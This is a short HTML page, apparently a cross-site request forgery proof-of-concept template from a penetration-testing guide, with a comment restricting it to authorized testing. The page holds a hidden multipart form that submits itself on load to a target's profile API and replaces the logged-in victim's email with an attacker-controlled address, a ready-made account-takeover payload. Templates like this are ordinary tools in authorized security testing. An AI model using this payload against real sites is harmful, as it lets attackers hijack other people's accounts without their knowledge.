<!doctype html>
<!-- multipart/form-data CSRF (guide §8). Needs SameSite=None. Useful when the endpoint expects multipart
     (e.g. profile/file forms). Authorized testing only; own test accounts; host cross-site; default browser. -->
<html><head><meta charset="utf-8"></head>
<body>
<h3>loading…</h3>
<form id="csrf" action="https://target.com/api/profile" method="POST" enctype="multipart/form-data">
  <input type="hidden" name="email" value="attacker@my-inbox.example">
</form>
<script>document.getElementById('csrf').submit();</script>
</body></html>
